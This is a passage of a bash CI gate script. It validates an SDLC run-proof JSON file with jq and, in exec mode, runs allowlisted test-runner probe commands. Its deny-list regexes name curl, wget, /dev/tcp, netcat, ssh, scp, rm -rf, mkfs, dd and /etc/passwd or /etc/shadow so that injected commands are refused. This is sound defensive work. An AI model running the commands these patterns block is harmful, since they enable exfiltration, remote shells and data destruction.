  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "unsafe evidence ref -> FAIL" 2 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  write_state "$tmp" "ship"
  WALTEUR_ROOT="$tmp" WALTEUR_SDLC_RUN=off bash "$self_path" >/dev/null 2>&1
  ck "bypass -> SKIP exit" 0 "$?"
  rm -rf "$tmp"

  tmp="$(mktemp -d "${TMPDIR:-/tmp}/sdlc-run-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"; touch "$tmp/walteur-kit/PAUSED"
  WALTEUR_ROOT="$tmp" bash "$self_path" >/dev/null 2>&1
  ck "PAUSED -> FAIL" 2 "$?"
  rm -rf "$tmp"

  echo "sdlc-run-gate selftest: $pass/$((pass+fail)) passed"
  [ "$fail" -eq 0 ]
}

if [ "${1:-}" = "--selftest" ]; then
  selftest
  exit $?
fi

if [ -f "$KIT/PAUSED" ]; then
  write_report "FAIL" "walteur-kit/PAUSED present" '{"paused":true}'
  echo "sdlc-run-gate verdict: FAIL - walteur-kit/PAUSED present -> $REPORT" >&2
  exit 2
fi

if [ "${WALTEUR_SDLC_RUN:-on}" = "off" ]; then
  write_report "SKIP" "bypassed via WALTEUR_SDLC_RUN=off" '{"bypassed":true}'
  echo "sdlc-run-gate verdict: SKIP - bypassed -> $REPORT" >&2
  exit 0
fi

for t in jq date; do
  if ! have "$t"; then
    write_report "SKIP" "$t not installed" "$(printf '{"missing_tool":"%s"}' "$t")"
    echo "sdlc-run-gate SKIP - required tool '$t' not installed." >&2
    exit 0
  fi
done

detect_required

if [ ! -f "$PROOF" ]; then
  if [ "$SDLC_REQUIRED" -eq 1 ]; then
    details="$(jq -n --arg reason "$SDLC_REQUIRED_REASON" '{required_reason:$reason}')"
    write_report "FAIL" "sdlc-run.json missing for ship/reflect phase" "$details"
    echo "sdlc-run-gate verdict: FAIL - missing sdlc-run.json -> $REPORT" >&2
    exit 2
  fi
  write_report "NOT_APPLICABLE" "no sdlc-run.json and no ship/reflect requirement" '{"required":false}'
  echo "sdlc-run-gate verdict: NOT_APPLICABLE - no required SDLC run proof -> $REPORT" >&2
  exit 0
fi

if ! jq -e . "$PROOF" >/dev/null 2>&1; then
  write_report "FAIL" "sdlc-run.json is not valid JSON" "{}"
  echo "sdlc-run-gate verdict: FAIL - invalid JSON -> $REPORT" >&2
  exit 2
fi

shape_err="$(jq -r '
  def err(c;m): if c then m else empty end;
  def nonempty($x): ($x|type) == "string" and ($x|length) > 0;
  def ref_at($i;$k): (.stages[$i].required_refs[$k] // "");
  def covers_builders($review):
    (.participants.builder_ids // []) as $builders
    | ($review.independent_from // []) as $ind
    | all($builders[]?; . as $b | ($ind | index($b)) != null);
  . as $doc
  | [
      err($doc.schema_version != 1; "schema_version must be 1"),
      err((nonempty($doc.run_id)|not); "run_id must be non-empty"),
      err(($doc.run_date|type)!="string" or ($doc.run_date|test("^[0-9]{4}-[0-9]{2}-[0-9]{2}$")|not); "run_date must be YYYY-MM-DD"),
      err(($doc.build_class as $v | ["software","workflow","data-ai","cloud-iac","mixed"] | index($v) | not); "build_class must be software/workflow/data-ai/cloud-iac/mixed"),
      err(($doc.risk_tier as $v | ["low","medium","high","regulated"] | index($v) | not); "risk_tier must be low/medium/high/regulated"),
      err($doc.verdict != "PASS"; "top-level verdict must be PASS"),
      err(($doc.participants.builder_ids|type)!="array" or ($doc.participants.builder_ids|length)<1; "participants.builder_ids must contain at least one builder"),
      err((($doc.participants.builder_ids // []) | length) != ((($doc.participants.builder_ids // []) | unique) | length); "participants.builder_ids must be unique"),
      err(($doc.participants.reviewer_ids|type)!="array" or ($doc.participants.reviewer_ids|length)<3; "participants.reviewer_ids must contain code, security, and QA reviewers"),
      err((nonempty($doc.participants.release_owner)|not); "participants.release_owner must be non-empty"),
      err(($doc.stages|type)!="array" or ($doc.stages|length)!=5; "stages must contain exactly five stages"),
      err((($doc.stages|type)=="array" and ($doc.stages|length)==5 and ([$doc.stages[].stage] != ["local_build","shared_dev","staging","beta","production"])); "stages must be ordered local_build -> shared_dev -> staging -> beta -> production"),
      err(any($doc.stages[]?; .verdict != "PASS"); "every stage verdict must be PASS"),
      err(any($doc.stages[]?; (nonempty(.owner)|not) or (nonempty(.started_at)|not) or (nonempty(.completed_at)|not) or (.started_at|test("^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$")|not) or (.completed_at|test("^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$")|not) or (.completed_at < .started_at)); "every stage needs owner plus ordered UTC timestamps"),
      err(any($doc.stages[]?; (.gate_refs|type)!="array" or (.gate_refs|length)<1 or (.evidence_refs|type)!="array" or (.evidence_refs|length)<1 or (.required_refs|type)!="object"); "every stage needs gate_refs, evidence_refs, and required_refs"),
      err((($doc.stages|type)=="array" and ($doc.stages|length)==5 and ($doc.stages[0].completed_at > $doc.stages[1].started_at or $doc.stages[1].completed_at > $doc.stages[2].started_at or $doc.stages[2].completed_at > $doc.stages[3].started_at or $doc.stages[3].completed_at > $doc.stages[4].started_at)); "stage timestamps must preserve stage order"),
      err((nonempty(ref_at(0;"tdd_ref"))|not) or (nonempty(ref_at(0;"unit_ref"))|not) or (nonempty(ref_at(0;"lint_ref"))|not) or (nonempty(ref_at(0;"build_ref"))|not); "local_build requires tdd_ref, unit_ref, lint_ref, and build_ref"),
      err((nonempty(ref_at(1;"code_review_ref"))|not) or (nonempty(ref_at(1;"security_review_ref"))|not) or (nonempty(ref_at(1;"integration_ref"))|not); "shared_dev requires code_review_ref, security_review_ref, and integration_ref"),
      err((nonempty(ref_at(2;"qa_ref"))|not) or (nonempty(ref_at(2;"e2e_ref"))|not) or (nonempty(ref_at(2;"environment_parity_ref"))|not) or (nonempty(ref_at(2;"performance_ref"))|not); "staging requires qa_ref, e2e_ref, environment_parity_ref, and performance_ref"),
      err((nonempty(ref_at(3;"adversarial_ref"))|not) or (nonempty(ref_at(3;"accessibility_ref"))|not) or (nonempty(ref_at(3;"docs_ref"))|not) or (nonempty(ref_at(3;"rollback_ref"))|not) or (nonempty(ref_at(3;"signoff_ref"))|not); "beta requires adversarial_ref, accessibility_ref, docs_ref, rollback_ref, and signoff_ref"),
      err((nonempty(ref_at(4;"deploy_ref"))|not) or (nonempty(ref_at(4;"smoke_ref"))|not) or (nonempty(ref_at(4;"monitoring_ref"))|not) or (nonempty(ref_at(4;"rollback_trigger_ref"))|not); "production requires deploy_ref, smoke_ref, monitoring_ref, and rollback_trigger_ref"),
      err((nonempty($doc.independence.code_review.reviewer_id)|not) or (($doc.participants.builder_ids // []) | index($doc.independence.code_review.reviewer_id)) != null or (covers_builders($doc.independence.code_review)|not) or (nonempty($doc.independence.code_review.evidence_ref)|not); "code_review must be independent from every builder and have evidence_ref"),
      err((nonempty($doc.independence.security_review.reviewer_id)|not) or (($doc.participants.builder_ids // []) | index($doc.independence.security_review.reviewer_id)) != null or (covers_builders($doc.independence.security_review)|not) or (nonempty($doc.independence.security_review.evidence_ref)|not); "security_review must be independent from every builder and have evidence_ref"),
      err((nonempty($doc.independence.qa_review.reviewer_id)|not) or (($doc.participants.builder_ids // []) | index($doc.independence.qa_review.reviewer_id)) != null or (covers_builders($doc.independence.qa_review)|not) or (nonempty($doc.independence.qa_review.evidence_ref)|not); "qa_review must be independent from every builder and have evidence_ref"),
      err($doc.signoff.required != true or (nonempty($doc.signoff.approver)|not) or (nonempty($doc.signoff.signoff_ref)|not); "signoff.required must be true with approver and signoff_ref"),
      err((nonempty($doc.retro.retro_ref)|not) or (nonempty($doc.retro.lessons_ref)|not); "retro requires retro_ref and lessons_ref"),
      err(($doc.metrics.total_agent_spawns|type)!="number" or $doc.metrics.total_agent_spawns < 1; "metrics.total_agent_spawns must be >= 1"),
      err(($doc.metrics.gate_failures|type)!="number" or $doc.metrics.gate_failures < 0; "metrics.gate_failures must be >= 0"),
      err(($doc.metrics.figure_it_out_recoveries|type)!="number" or $doc.metrics.figure_it_out_recoveries < 0; "metrics.figure_it_out_recoveries must be >= 0")
    ] | map(select(. != null)) | .[]
' "$PROOF" 2>/dev/null)"

if [ -n "$shape_err" ]; then
  findings="$(printf '%s\n' "$shape_err" | jq -R -s 'split("\n") | map(select(length > 0)) | map({check:"shape", message:.})')"
  write_report "FAIL" "sdlc-run.json missing required SDLC run proof" "$(jq -n --argjson findings "$findings" '{findings:$findings}')"
  echo "sdlc-run-gate verdict: FAIL - missing required SDLC run proof -> $REPORT" >&2
  exit 2
fi

run_date="$(jq -r '.run_date' "$PROOF")"
if ! proof_epoch="$(date -u -j -f %F "$run_date" +%s 2>/dev/null)"; then
  if ! proof_epoch="$(date -u -d "$run_date" +%s 2>/dev/null)"; then
    proof_epoch=0
  fi
fi
now_epoch="$(date -u +%s)"
max_age_seconds=$((MAX_AGE_DAYS * 86400))
if [ "$proof_epoch" -le 0 ] || [ $((now_epoch - proof_epoch)) -gt "$max_age_seconds" ]; then
  details="$(jq -n --arg run_date "$run_date" --argjson max_age_days "$MAX_AGE_DAYS" '{run_date:$run_date, max_age_days:$max_age_days}')"
  write_report "FAIL" "sdlc-run.json is stale" "$details"
  echo "sdlc-run-gate verdict: FAIL - stale proof -> $REPORT" >&2
  exit 2
fi

refs="$(jq -r '
  [
    (.stages[]?.gate_refs[]?),
    (.stages[]?.evidence_refs[]?),
    (.stages[]?.required_refs? | .[]?),
    .independence.code_review.evidence_ref,
    .independence.security_review.evidence_ref,
    .independence.qa_review.evidence_ref,
    .signoff.signoff_ref,
    .retro.retro_ref,
    .retro.lessons_ref
  ] | .[] | select(type == "string" and length > 0)
' "$PROOF")"

bad_refs=""
while IFS= read -r ref; do
  [ -n "$ref" ] || continue
  case "$ref" in
    /*|*../*|../*) bad_refs="${bad_refs}${ref}: unsafe path"$'\n'; continue ;;
  esac
  path="$ROOT/$ref"
  if [ ! -f "$path" ]; then
    bad_refs="${bad_refs}${ref}: missing"$'\n'
  elif [ ! -s "$path" ]; then
    bad_refs="${bad_refs}${ref}: empty"$'\n'
  fi
done <<EOF
$refs
EOF

if [ -n "$bad_refs" ]; then
  findings="$(printf '%s' "$bad_refs" | jq -R -s 'split("\n") | map(select(length > 0)) | map({check:"evidence_ref", message:.})')"
  write_report "FAIL" "SDLC run evidence refs are missing, empty, or unsafe" "$(jq -n --argjson findings "$findings" '{findings:$findings}')"
  echo "sdlc-run-gate verdict: FAIL - evidence refs invalid -> $REPORT" >&2
  exit 2
fi

# ── EXECUTE PROBE — staging e2e_ref (S033 sdlc C5) ──────────────────────────────────────────────
# Under EXEC mode, checking that stages[2].required_refs.e2e_ref merely EXISTS on disk (the bad_refs
# loop above) is a file-existence check, not proof the E2E suite ran. When WALTEUR_SDLC_EXEC=1, the
# staging e2e_ref must itself be a runnable probe: its file content is parsed as {"command":...,
# "expect_exit":...} JSON (or, for a plain-text evidence file, its first non-empty line is treated as
# the command with expect_exit defaulting to 0). That command is routed through the SAME shared guard
# used for the whole-pipeline probe (_probe-proof.sh's probe_proves_something — rejects no-op/constant
# wrappers), then actually eval'd and its exit OBSERVED against expect_exit. A file that merely exists
# (e.g. "e2e evidence\n" from a hand-written report) is no longer sufficient proof under EXEC.
if [ "${WALTEUR_SDLC_EXEC:-0}" = "1" ]; then
  e2e_ref="$(jq -r '.stages[2].required_refs.e2e_ref // ""' "$PROOF" 2>/dev/null)"
  if [ -z "$e2e_ref" ]; then
    write_report "FAIL" "WALTEUR_SDLC_EXEC=1: staging stage requires e2e_ref"
    echo "sdlc-run-gate verdict: FAIL - exec mode requires staging e2e_ref -> $REPORT" >&2
    exit 2
  fi
  e2e_path="$ROOT/$e2e_ref"
  e2e_cmd=""
  e2e_expect=0
  if have jq && jq -e . "$e2e_path" >/dev/null 2>&1; then
    e2e_cmd="$(jq -r '.command // ""' "$e2e_path" 2>/dev/null)"
    e2e_expect="$(jq -r '.expect_exit // 0' "$e2e_path" 2>/dev/null)"
  fi
  if [ -z "$e2e_cmd" ]; then
    e2e_cmd="$(grep -m1 '[^[:space:]]' "$e2e_path" 2>/dev/null | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
  fi
  if [ -z "$e2e_cmd" ]; then
    write_report "FAIL" "WALTEUR_SDLC_EXEC=1: staging e2e_ref ($e2e_ref) has no runnable command — a file-existence-only e2e proof is rejected under EXEC"
    echo "sdlc-run-gate verdict: FAIL - staging e2e_ref not a runnable probe -> $REPORT" >&2
    exit 2
  fi
  case "$e2e_cmd" in
    true|false|:|/bin/true|/usr/bin/true|/bin/false|/usr/bin/false)
      write_report "FAIL" "WALTEUR_SDLC_EXEC=1: staging e2e_ref probe is a trivial no-op ($e2e_cmd) — it must run a REAL E2E suite, not a constant that passes by doing nothing"
      echo "sdlc-run-gate verdict: FAIL - trivial no-op e2e probe -> $REPORT" >&2; exit 2 ;;
  esac
  if ! command -v probe_proves_something >/dev/null 2>&1; then
    write_report "FAIL" "shared probe guard _probe-proof.sh unavailable — cannot verify staging e2e_ref proves a real control (fail-closed)"
    echo "sdlc-run-gate verdict: FAIL - probe guard unavailable (fail-closed) -> $REPORT" >&2; exit 2
  fi
  if ! probe_proves_something "$e2e_cmd"; then
    write_report "FAIL" "WALTEUR_SDLC_EXEC=1: staging e2e_ref command references no real test artifact/runner — it cannot prove the E2E control ran (no-op/constant probe)"
    echo "sdlc-run-gate verdict: FAIL - unprovable/no-op e2e probe -> $REPORT" >&2; exit 2
  fi
  e2e_first="$(printf '%s' "$e2e_cmd" | awk '{print $1}')"
  case "$e2e_first" in
    true|false|:|npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tox|uv|go|cargo|make|just|task|bash|sh|jest|vitest|mocha|rspec|rake|phpunit|composer|dotnet|mvn|gradle|./gradlew|ctest|cmake|playwright|cypress) : ;;
    *) write_report "FAIL" "staging e2e_ref runner '$e2e_first' is not an allowlisted test runner (injection guard)"; echo "sdlc-run-gate verdict: FAIL - e2e probe runner not allowlisted -> $REPORT" >&2; exit 2 ;;
  esac
  if printf '%s' "$e2e_cmd" | grep -Eqi 'curl|wget|/dev/tcp|base64|netcat|ncat|rm[[:space:]]+-rf|sudo|mkfs|[[:space:]]dd[[:space:]]|ssh[[:space:]]|scp[[:space:]]|\$\(|`|/etc/(passwd|shadow)'; then
    write_report "FAIL" "staging e2e_ref command contains a dangerous token; refusing to run"; echo "sdlc-run-gate verdict: FAIL - dangerous token in e2e probe -> $REPORT" >&2; exit 2
  fi
  ( cd "$ROOT" && eval "$e2e_cmd" >/dev/null 2>&1 ); e2e_rc=$?
  if [ "$e2e_rc" != "$e2e_expect" ]; then
    write_report "FAIL" "staging e2e_ref probe EXECUTED and did NOT reproduce (exit $e2e_rc != expected $e2e_expect)" "$(jq -n --arg c "$e2e_cmd" --argjson got "$e2e_rc" --argjson want "${e2e_expect:-0}" '{staging_e2e_probe:$c, exit:$got, expected:$want}')"
    echo "sdlc-run-gate verdict: FAIL - staging e2e probe did not reproduce -> $REPORT" >&2
    exit 2
  fi
  STAGING_E2E_PROBE_EXECUTED="$e2e_cmd"
fi

# ── EXECUTE PROBE — OBSERVE the SDLC pipeline actually runs green; do not merely read a ref ───────
# Same discipline as authz-tenant/privacy-data (verdict-reader -> executor): a re-runnable
# pipeline_probe = {command, expect_exit} is RE-RUN and its exit OBSERVED (the CI/build/test pipeline
# really passes). WALTEUR_SDLC_EXEC=1 makes it REQUIRED (shape-only proof rejected). Reuses the ship-gate
# injection guard: allowlisted runner + dangerous-token refusal.
probe_cmd="$(jq -r '.pipeline_probe.command // ""' "$PROOF" 2>/dev/null)"
probe_expect="$(jq -r '.pipeline_probe.expect_exit // 0' "$PROOF" 2>/dev/null)"
if [ "${WALTEUR_SDLC_EXEC:-0}" = "1" ] && [ -z "$probe_cmd" ]; then
  write_report "FAIL" "WALTEUR_SDLC_EXEC=1: SDLC proof requires pipeline_probe.command (execution-backed pipeline), not a ref-only proof"
  echo "sdlc-run-gate verdict: FAIL - exec mode requires pipeline_probe -> $REPORT" >&2
  exit 2
fi
if [ -n "$probe_cmd" ]; then
  # Reject a TRIVIAL no-op probe (independent audit S008: command:"true" proved nothing). Decidable bare
  # no-ops only; that an arbitrary command exercises the pipeline is the negative-control discipline's job.
  probe_trim="$(printf '%s' "$probe_cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
  case "$probe_trim" in
    true|false|:|/bin/true|/usr/bin/true|/bin/false|/usr/bin/false)
      write_report "FAIL" "pipeline_probe is a trivial no-op ($probe_trim) — it must run a REAL pipeline/test, not a constant that passes by doing nothing"
      echo "sdlc-run-gate verdict: FAIL - trivial no-op probe -> $REPORT" >&2; exit 2 ;;
  esac
  # Also reject a CONSTANT-EXIT WRAPPER (independent panel: bash -c 'exit 0' / sh -c 'true' / bash -c ':'
  # / a bare 'exit 0' slip past the bare-constant list above and prove NOTHING while passing). The narrow
  # per-file regex below is kept as a harmless/redundant fast-reject, but the AUTHORITATIVE check is now the
  # shared guard probe_proves_something() in _probe-proof.sh — it closes the WHOLE constant-exit CLASS
  # (bash -lc 'exit 0', trailing ';'/comments, node/python no-op bodies, compound no-ops) by requiring the
  # probe to invoke a recognized runner OR touch a real on-disk artifact. Enumerating evasions is undecidable.
  probe_norm="$(printf '%s' "$probe_trim" | tr -d '"'\''')"
  if printf '%s' "$probe_norm" | grep -Eiq '^([[:alnum:]_./-]*/)?(bash|sh)[[:space:]]+-c[[:space:]]+(exit[[:space:]]+[0-9]+|true|false|:)[[:space:]]*$|^exit[[:space:]]+[0-9]+[[:space:]]*$'; then
    write_report "FAIL" "pipeline_probe is a constant-exit wrapper ($probe_trim) — the probe must run a REAL test, not a constant"
    echo "sdlc-run-gate verdict: FAIL - constant-exit wrapper probe -> $REPORT" >&2; exit 2
  fi
  # AUTHORITATIVE unprovable-probe check (shared guard). FAIL CLOSED if the guard failed to load: a probe
  # that proves nothing must never slip through because a sibling file was missing at runtime.
  if ! command -v probe_proves_something >/dev/null 2>&1; then
    write_report "FAIL" "shared probe guard _probe-proof.sh unavailable — cannot verify pipeline_probe proves a real control (fail-closed)"
    echo "sdlc-run-gate verdict: FAIL - probe guard unavailable (fail-closed) -> $REPORT" >&2; exit 2
  fi
  if ! probe_proves_something "$probe_trim"; then
    write_report "FAIL" "pipeline_probe.command references no real test artifact/runner — it cannot prove the control (no-op/constant probe)"
    echo "sdlc-run-gate verdict: FAIL - unprovable/no-op probe -> $REPORT" >&2; exit 2
  fi
  probe_first="$(printf '%s' "$probe_cmd" | awk '{print $1}')"
  case "$probe_first" in
    true|false|:|npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tox|uv|go|cargo|make|just|task|bash|sh|jest|vitest|mocha|rspec|rake|phpunit|composer|dotnet|mvn|gradle|./gradlew|ctest|cmake) : ;;
    *) write_report "FAIL" "pipeline_probe runner '$probe_first' is not an allowlisted test runner (injection guard)"; echo "sdlc-run-gate verdict: FAIL - probe runner not allowlisted -> $REPORT" >&2; exit 2 ;;
  esac
  if printf '%s' "$probe_cmd" | grep -Eqi 'curl|wget|/dev/tcp|base64|netcat|ncat|rm[[:space:]]+-rf|sudo|mkfs|[[:space:]]dd[[:space:]]|ssh[[:space:]]|scp[[:space:]]|\$\(|`|/etc/(passwd|shadow)'; then
    write_report "FAIL" "pipeline_probe command contains a dangerous token; refusing to run"; echo "sdlc-run-gate verdict: FAIL - dangerous token -> $REPORT" >&2; exit 2
  fi
  ( cd "$ROOT" && eval "$probe_cmd" >/dev/null 2>&1 ); probe_rc=$?
  if [ "$probe_rc" != "$probe_expect" ]; then
    write_report "FAIL" "SDLC pipeline probe EXECUTED and did NOT reproduce (exit $probe_rc != expected $probe_expect)" "$(jq -n --arg c "$probe_cmd" --argjson got "$probe_rc" --argjson want "${probe_expect:-0}" '{probe:$c, exit:$got, expected:$want}')"
    echo "sdlc-run-gate verdict: FAIL - pipeline probe did not reproduce -> $REPORT" >&2
    exit 2
  fi
  jq -n --arg v "PASS" --arg ts "$TS" --arg proof "${PROOF#"$ROOT"/}" --arg rd "$run_date" --arg c "$probe_cmd" --arg e2e "${STAGING_E2E_PROBE_EXECUTED:-}" \
    '{verdict:$v, ts:$ts, gate:"sdlc-run-gate", proof_file:$proof, reason:"SDLC run proof valid + pipeline OBSERVED green by execution", run_date:$rd, pipeline_probe_executed:$c, observed_exit:0} + (if $e2e != "" then {staging_e2e_probe_executed:$e2e} else {} end)' \
    > "$REPORT" 2>/dev/null || write_report "PASS" "SDLC run proof valid + pipeline OBSERVED green by execution"
  echo "sdlc-run-gate verdict: PASS - pipeline OBSERVED green by executing probe '$probe_cmd' -> $REPORT" >&2
  exit 0
fi

details="$(jq -n --arg run_date "$run_date" --arg e2e "${STAGING_E2E_PROBE_EXECUTED:-}" '{run_date:$run_date, stage_count:5} + (if $e2e != "" then {staging_e2e_probe_executed:$e2e} else {} end)')"
write_report "PASS" "SDLC run proof passes" "$details"
echo "sdlc-run-gate verdict: PASS - SDLC run proof passes -> $REPORT" >&2
exit 0
